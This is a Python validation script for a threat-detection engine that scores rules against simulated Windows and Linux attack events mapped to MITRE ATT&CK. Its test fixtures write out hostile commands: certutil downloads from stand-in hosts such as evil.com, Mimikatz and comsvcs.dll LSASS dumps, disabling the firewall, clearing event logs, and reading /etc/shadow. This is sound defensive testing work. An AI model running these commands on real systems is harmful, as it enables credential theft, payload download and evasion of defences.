#!/usr/bin/env python3
"""
advanced_validation.py

Advanced end-to-end validation with complex attack scenarios.
Tests detection depth, accuracy, and edge cases.
"""

import sys
import os
from pathlib import Path
from datetime import datetime

from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn

# Add current directory to path
sys.path.insert(0, str(Path(__file__).parent))

from core.detector import load_rules, match_rule, generate_alert
from core.storage import AlertStorage
from core.mitre_attack import get_mitre_attack
from core.mapper import get_mitre_mapper

console = Console()


# Advanced test cases covering various attack techniques and evasion
ADVANCED_TEST_CASES = [
    {
        "name": "PowerShell Base64 Encoded Command (Standard)",
        "category": "Execution",
        "difficulty": "Easy",
        "event": {
            "event_id": "4688",
            "process_name": "powershell.exe",
            "command_line": "powershell.exe -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA"
        },
        "should_detect": True,
        "expected_techniques": ["T1059.001"]
    },
    {
        "name": "PowerShell Base64 with Obfuscated Flag (-e)",
        "category": "Execution",
        "difficulty": "Medium",
        "event": {
            "event_id": "4688",
            "process_name": "powershell.exe",
            "command_line": "powershell.exe -e SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA"
        },
        "should_detect": True,
        "expected_techniques": ["T1059.001"]
    },
    {
        "name": "PowerShell Base64 with Multiple Obfuscation (-en)",
        "category": "Execution",
        "difficulty": "Medium",
        "event": {
            "event_id": "4688",
            "process_name": "powershell.exe",
            "command_line": "powershell.exe -en SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA"
        },
        "should_detect": True,
        "expected_techniques": ["T1059.001"]
    },
    {
        "name": "PowerShell Case Variation (PoWeRsHeLl.ExE)",
        "category": "Execution",
        "difficulty": "Easy",
        "event": {
            "event_id": "4688",
            "process_name": "PoWeRsHeLl.ExE",
            "command_line": "PoWeRsHeLl.ExE -ENCODEDCOMMAND ABC123"
        },
        "should_detect": True,
        "expected_techniques": ["T1059.001"]
    },
    {
        "name": "Mimikatz with Standard Arguments",
        "category": "Credential Access",
        "difficulty": "Easy",
        "event": {
            "event_id": "4688",
            "process_name": "mimikatz.exe",
            "command_line": "mimikatz.exe privilege::debug sekurlsa::logonpasswords"
        },
        "should_detect": True,
        "expected_techniques": ["T1003"]
    },
    {
        "name": "Mimikatz Renamed (evil.exe)",
        "category": "Credential Access",
        "difficulty": "Hard",
        "event": {
            "event_id": "4688",
            "process_name": "evil.exe",
            "command_line": "evil.exe privilege::debug sekurlsa::logonpasswords"
        },
        "should_detect": True,  # Should detect by command arguments
        "expected_techniques": ["T1003"]
    },
    {
        "name": "LSASS Dump via comsvcs.dll",
        "category": "Credential Access",
        "difficulty": "Medium",
        "event": {
            "event_id": "4688",
            "process_name": "rundll32.exe",
            "command_line": "rundll32.exe C:\\Windows\\System32\\comsvcs.dll,MiniDump 644 C:\\temp\\lsass.dmp full"
        },
        "should_detect": True,
        "expected_techniques": ["T1003.001"]
    },
    {
        "name": "LSASS Dump with Process ID Variation",
        "category": "Credential Access",
        "difficulty": "Medium",
        "event": {
            "event_id": "4688",
            "process_name": "rundll32.exe",
            "command_line": "rundll32.exe comsvcs.dll MiniDump 1234 dump.dmp"
        },
        "should_detect": True,
        "expected_techniques": ["T1003.001"]
    },
    {
        "name": "Certutil Download with Full URL",
        "category": "Command and Control",
        "difficulty": "Easy",
        "event": {
            "event_id": "4688",
            "process_name": "certutil.exe",
            "command_line": "certutil.exe -urlcache -f http://evil.com/payload.exe malware.exe"
        },
        "should_detect": True,
        "expected_techniques": ["T1105"]
    },
    {
        "name": "Certutil with HTTPS",
        "category": "Command and Control",
        "difficulty": "Easy",
        "event": {
            "event_id": "4688",
            "process_name": "certutil.exe",
            "command_line": "certutil.exe -urlcache https://attacker.com/tool.exe"
        },
        "should_detect": True,
        "expected_techniques": ["T1105"]
    },
    {
        "name": "Windows Firewall Disable",
        "category": "Defense Evasion",
        "difficulty": "Easy",
        "event": {
            "event_id": "4688",
            "process_name": "netsh.exe",
            "command_line": "netsh advfirewall set allprofiles state off"
        },
        "should_detect": True,
        "expected_techniques": ["T1562.004"]
    },
    {
        "name": "Event Log Clear (Event ID 1102)",
        "category": "Defense Evasion",
        "difficulty": "Easy",
        "event": {
            "event_id": "1102",
            "process_name": "wevtutil.exe",
            "command_line": "wevtutil.exe cl Security"
        },
        "should_detect": True,
        "expected_techniques": ["T1070.001"]
    },
    {
        "name": "BloodHound Enumeration (Invoke-BloodHound)",
        "category": "Discovery",
        "difficulty": "Medium",
        "event": {
            "event_id": "4688",
            "process_name": "powershell.exe",
            "command_line": "powershell.exe Invoke-BloodHound -CollectionMethod All -Domain corp.local"
        },
        "should_detect": True,
        "expected_techniques": ["T1482"]
    },
    {
        "name": "BloodHound with SharpHound",
        "category": "Discovery",
        "difficulty": "Medium",
        "event": {
            "event_id": "4688",
            "process_name": "SharpHound.exe",
            "command_line": "SharpHound.exe --CollectionMethods All"
        },
        "should_detect": True,
        "expected_techniques": ["T1482"]
    },
    {
        "name": "Linux Shadow File Access",
        "category": "Credential Access",
        "difficulty": "Easy",
        "event": {
            "event_type": "credential_access",
            "process": "cat",
            "target": "/etc/shadow",
            "executable": "/bin/cat"
        },
        "should_detect": True,
        "expected_techniques": ["T1003"]
    },
    {
        "name": "SSH Key Modification",
        "category": "Persistence",
        "difficulty": "Easy",
        "event": {
            "process": "bash",
            "target": "/home/user/.ssh/authorized_keys",
            "executable": "/bin/bash"
        },
        "should_detect": True,
        "expected_techniques": ["T1098.004"]
    },
    {
        "name": "Cron Job Persistence",
        "category": "Persistence",
        "difficulty": "Easy",
        "event": {
            "process": "bash",
            "target": "/etc/crontab",
            "executable": "/bin/bash"
        },
        "should_detect": True,
        "expected_techniques": ["T1053.003"]
    },
    {
        "name": "Sudoers Modification",
        "category": "Privilege Escalation",
        "difficulty": "Medium",
        "event": {
            "process": "vim",
            "target": "/etc/sudoers",
            "executable": "/usr/bin/vim"
        },
        "should_detect": True,
        "expected_techniques": ["T1548"]
    },
    {
        "name": "Local Account Creation (useradd)",
        "category": "Persistence",
        "difficulty": "Easy",
        "event": {
            "process_name": "useradd",
            "command_line": "useradd -m hacker",
            "executable": "/usr/sbin/useradd"
        },
        "should_detect": True,
        "expected_techniques": ["T1136.001"]
    },
    # Edge cases and evasion techniques
    {
        "name": "Benign PowerShell (No Encoding)",
        "category": "Execution",
        "difficulty": "Easy",
        "event": {
            "event_id": "4688",
            "process_name": "powershell.exe",
            "command_line": "powershell.exe Get-Process"
        },
        "should_detect": False,
        "expected_techniques": []
    },
    {
        "name": "Benign certutil (Certificate Operations)",
        "category": "Command and Control",
        "difficulty": "Easy",
        "event": {
            "event_id": "4688",
            "process_name": "certutil.exe",
            "command_line": "certutil.exe -store -user My"
        },
        "should_detect": False,
        "expected_techniques": []
    },
    {
        "name": "Benign netsh (View Configuration)",
        "category": "Defense Evasion",
        "difficulty": "Easy",
        "event": {
            "event_id": "4688",
            "process_name": "netsh.exe",
            "command_line": "netsh advfirewall show allprofiles"
        },
        "should_detect": False,
        "expected_techniques": []
    },
    {
        "name": "PowerShell with Uncommon Encoding Flag (-ec)",
        "category": "Execution",
        "difficulty": "Hard",
        "event": {
            "event_id": "4688",
            "process_name": "powershell.exe",
            "command_line": "powershell.exe -ec SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA"
        },
        "should_detect": True,  # Our regex should catch this
        "expected_techniques": ["T1059.001"]
    },
    {
        "name": "Nested Command with Multiple Techniques",
        "category": "Multi-Stage",
        "difficulty": "Hard",
        "event": {
            "event_id": "4688",
            "process_name": "cmd.exe",
            "command_line": 'cmd.exe /c "powershell.exe -enc ABC123 && certutil -urlcache -f http://evil.com/tool.exe"'
        },
        "should_detect": True,  # Should detect PowerShell encoding
        "expected_techniques": ["T1059.001"]
    },
    {
        "name": "PowerShell Full Path",
        "category": "Execution",
        "difficulty": "Medium",
        "event": {
            "event_id": "4688",
            "process_name": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "command_line": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -EncodedCommand ABC"
        },
        "should_detect": True,
        "expected_techniques": ["T1059.001"]
    }
]


def run_advanced_validation():
    """Run advanced validation with complex test cases."""

    console.print(Panel.fit(
        "[bold cyan]Advanced End-to-End Validation[/bold cyan]\n"
        "[white]Testing Detection Depth and Accuracy[/white]",
        border_style="cyan"
    ))

    # Load detection system
    console.print("\n[cyan]Initializing detection system...[/cyan]")

    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        console=console
    ) as progress:
        task1 = progress.add_task("Loading rules...", total=None)
        rules = load_rules("rules/")
        progress.update(task1, completed=True)

        task2 = progress.add_task("Loading MITRE ATT&CK...", total=None)
        mitre = get_mitre_attack()
        progress.update(task2, completed=True)

        task3 = progress.add_task("Initializing mapper...", total=None)
        mapper = get_mitre_mapper()
        mapper.map_rules(rules)
        progress.update(task3, completed=True)

    console.print(f"[green]✓ Loaded {len(rules)} detection rules[/green]")
    console.print(f"[green]✓ Loaded {len(mitre.get_all_techniques())} MITRE techniques[/green]")

    # Run test cases
    console.print(f"\n[bold cyan]Running {len(ADVANCED_TEST_CASES)} advanced test cases...[/bold cyan]\n")

    results = {
        "total": len(ADVANCED_TEST_CASES),
        "passed": 0,
        "failed": 0,
        "true_positives": 0,
        "true_negatives": 0,
        "false_positives": 0,
        "false_negatives": 0,
        "by_difficulty": {"Easy": {"passed": 0, "total": 0}, "Medium": {"passed": 0, "total": 0}, "Hard": {"passed": 0, "total": 0}},
        "by_category": {},
        "details": []
    }

    for idx, test_case in enumerate(ADVANCED_TEST_CASES, 1):
        console.print(f"[dim]Test {idx}/{len(ADVANCED_TEST_CASES)}:[/dim] {test_case['name']}")

        event = test_case["event"]
        should_detect = test_case["should_detect"]
        difficulty = test_case["difficulty"]
        category = test_case["category"]

        # Track by difficulty
        results["by_difficulty"][difficulty]["total"] += 1

        # Track by category
        if category not in results["by_category"]:
            results["by_category"][category] = {"passed": 0, "total": 0}
        results["by_category"][category]["total"] += 1

        # Run detection
        detected = False
        matched_techniques = []

        for rule in rules:
            if match_rule(event, rule):
                detected = True
                technique_id = rule.get('mitre', {}).get('attack_id')
                if technique_id:
                    matched_techniques.append(technique_id)

        # Evaluate result
        passed = False
        result_type = ""

        if should_detect and detected:
            result_type = "True Positive"
            results["true_positives"] += 1
            passed = True
        elif not should_detect and not detected:
            result_type = "True Negative"
            results["true_negatives"] += 1
            passed = True
        elif should_detect and not detected:
            result_type = "False Negative"
            results["false_negatives"] += 1
            passed = False
        elif not should_detect and detected:
            result_type = "False Positive"
            results["false_positives"] += 1
            passed = False

        if passed:
            results["passed"] += 1
            results["by_difficulty"][difficulty]["passed"] += 1
            results["by_category"][category]["passed"] += 1
            console.print(f"  [green]✓ {result_type}[/green]")
        else:
            results["failed"] += 1
            console.print(f"  [red]✗ {result_type}[/red]")

        # Store details
        results["details"].append({
            "name": test_case["name"],
            "category": category,
            "difficulty": difficulty,
            "should_detect": should_detect,
            "detected": detected,
            "matched_techniques": matched_techniques,
            "expected_techniques": test_case.get("expected_techniques", []),
            "result_type": result_type,
            "passed": passed
        })

    # Display results
    display_results(results)

    return results


def display_results(results):
    """Display validation results."""

    console.print("\n" + "="*70)
    console.print(Panel.fit(
        "[bold white]Validation Results Summary[/bold white]",
        border_style="cyan"
    ))

    # Overall statistics
    accuracy = (results["passed"] / results["total"] * 100) if results["total"] > 0 else 0
    precision = (results["true_positives"] / (results["true_positives"] + results["false_positives"]) * 100) if (results["true_positives"] + results["false_positives"]) > 0 else 0
    recall = (results["true_positives"] / (results["true_positives"] + results["false_negatives"]) * 100) if (results["true_positives"] + results["false_negatives"]) > 0 else 0

    console.print(f"\n[bold]Overall Performance:[/bold]")
    console.print(f"  Total Tests: {results['total']}")
    console.print(f"  Passed: [green]{results['passed']}[/green]")
    console.print(f"  Failed: [red]{results['failed']}[/red]")
    console.print(f"  Accuracy: [{'green' if accuracy >= 90 else 'yellow' if accuracy >= 80 else 'red'}]{accuracy:.1f}%[/]")

    console.print(f"\n[bold]Detection Metrics:[/bold]")
    console.print(f"  True Positives (TP): [green]{results['true_positives']}[/green]")
    console.print(f"  True Negatives (TN): [green]{results['true_negatives']}[/green]")
    console.print(f"  False Positives (FP): [red]{results['false_positives']}[/red]")
    console.print(f"  False Negatives (FN): [red]{results['false_negatives']}[/red]")
    console.print(f"  Precision: [{'green' if precision >= 90 else 'yellow' if precision >= 80 else 'red'}]{precision:.1f}%[/]")
    console.print(f"  Recall: [{'green' if recall >= 90 else 'yellow' if recall >= 80 else 'red'}]{recall:.1f}%[/]")

    # By difficulty
    console.print(f"\n[bold]Performance by Difficulty:[/bold]")
    table = Table()
    table.add_column("Difficulty", style="cyan")
    table.add_column("Passed", style="green", justify="right")
    table.add_column("Total", style="white", justify="right")
    table.add_column("Success Rate", style="yellow", justify="right")

    for difficulty in ["Easy", "Medium", "Hard"]:
        data = results["by_difficulty"][difficulty]
        rate = (data["passed"] / data["total"] * 100) if data["total"] > 0 else 0
        table.add_row(
            difficulty,
            str(data["passed"]),
            str(data["total"]),
            f"{rate:.1f}%"
        )

    console.print(table)

    # By category
    console.print(f"\n[bold]Performance by Attack Category:[/bold]")
    table2 = Table()
    table2.add_column("Category", style="cyan")
    table2.add_column("Passed", style="green", justify="right")
    table2.add_column("Total", style="white", justify="right")
    table2.add_column("Success Rate", style="yellow", justify="right")

    for category in sorted(results["by_category"].keys()):
        data = results["by_category"][category]
        rate = (data["passed"] / data["total"] * 100) if data["total"] > 0 else 0
        table2.add_row(
            category,
            str(data["passed"]),
            str(data["total"]),
            f"{rate:.1f}%"
        )

    console.print(table2)

    # Failed tests details
    failed_tests = [d for d in results["details"] if not d["passed"]]
    if failed_tests:
        console.print(f"\n[bold red]Failed Tests ({len(failed_tests)}):[/bold red]")
        for test in failed_tests:
            console.print(f"  • {test['name']}")
            console.print(f"    Type: {test['result_type']}")
            console.print(f"    Difficulty: {test['difficulty']}")
            if test["result_type"] == "False Negative":
                console.print(f"    Expected: {test['expected_techniques']}")
                console.print(f"    Detected: {test['matched_techniques'] if test['matched_techniques'] else 'None'}")
    else:
        console.print(f"\n[bold green]✓ All tests passed![/bold green]")

    # Detection depth analysis
    console.print(f"\n[bold]Detection Depth Analysis:[/bold]")

    technique_coverage = set()
    for detail in results["details"]:
        if detail["detected"]:
            technique_coverage.update(detail["matched_techniques"])

    console.print(f"  Unique techniques detected in tests: {len(technique_coverage)}")
    console.print(f"  Techniques: {', '.join(sorted(technique_coverage))}")

    # Recommendations
    console.print(f"\n[bold]Recommendations:[/bold]")

    if results["false_negatives"] > 0:
        console.print("  [yellow]⚠ False Negatives detected - Consider enhancing rules for missed attacks[/yellow]")

    if results["false_positives"] > 0:
        console.print("  [yellow]⚠ False Positives detected - Consider refining rules to reduce noise[/yellow]")

    if accuracy >= 95:
        console.print("  [green]✓ Excellent detection accuracy[/green]")
    elif accuracy >= 85:
        console.print("  [yellow]⚠ Good detection accuracy, room for improvement[/yellow]")
    else:
        console.print("  [red]✗ Detection accuracy needs improvement[/red]")


def main():
    try:
        results = run_advanced_validation()

        # Final verdict
        console.print("\n" + "="*70)

        accuracy = (results["passed"] / results["total"] * 100)

        if accuracy >= 95 and results["false_positives"] == 0:
            console.print(Panel.fit(
                "[bold green]✓ EXCELLENT - Detection System Highly Effective[/bold green]\n"
                f"[white]Accuracy: {accuracy:.1f}% | No False Positives[/white]",
                border_style="green"
            ))
        elif accuracy >= 85:
            console.print(Panel.fit(
                "[bold yellow]⚠ GOOD - Detection System Effective with Minor Issues[/bold yellow]\n"
                f"[white]Accuracy: {accuracy:.1f}%[/white]",
                border_style="yellow"
            ))
        else:
            console.print(Panel.fit(
                "[bold red]✗ NEEDS IMPROVEMENT - Detection Gaps Identified[/bold red]\n"
                f"[white]Accuracy: {accuracy:.1f}%[/white]",
                border_style="red"
            ))

    except KeyboardInterrupt:
        console.print("\n[yellow]Validation interrupted[/yellow]")
        sys.exit(1)
    except Exception as e:
        console.print(f"\n[red]Error: {e}[/red]")
        import traceback
        traceback.print_exc()
        sys.exit(1)


if __name__ == "__main__":
    main()
